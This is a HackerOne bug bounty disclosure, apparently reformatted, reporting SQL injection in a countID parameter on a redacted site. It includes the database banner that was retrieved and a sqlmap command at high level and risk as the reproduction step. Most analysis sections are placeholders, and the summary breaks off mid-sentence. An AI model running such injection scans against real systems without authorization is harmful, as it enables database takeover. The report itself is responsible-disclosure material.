# SQL Injection on www.██████████ on countID parameter

## Metadata
- **Source:** HackerOne
- **Report:** 390879 | https://hackerone.com/reports/390879
- **Submitted:** 2018-08-06
- **Reporter:** 0_1vitthal
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** high
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
**Description:**
Hello Team,
I have came across a sql injection vulnerability on www.██████ on countID parameter. I was able to retrieve the banner which is

> Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64& 
	Mar 19 2015 12:32:14 
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

after confirming the vulnerability i have s

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**
Hello Team,
I have came across a sql injection vulnerability on www.██████ on countID parameter. I was able to retrieve the banner which is

> Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64& 
	Mar 19 2015 12:32:14 
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

after confirming the vulnerability i have stopped testing further.

**Vulnerable URL:**
https://www.███/public/saveCount.cfm?countID=4

**Steps to Reproduce:**
1. python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3 

**POC**
█████████

## Impact

Attacker can take control over the database server.

</details>

---
*Analysed by Claude on 2026-05-24*
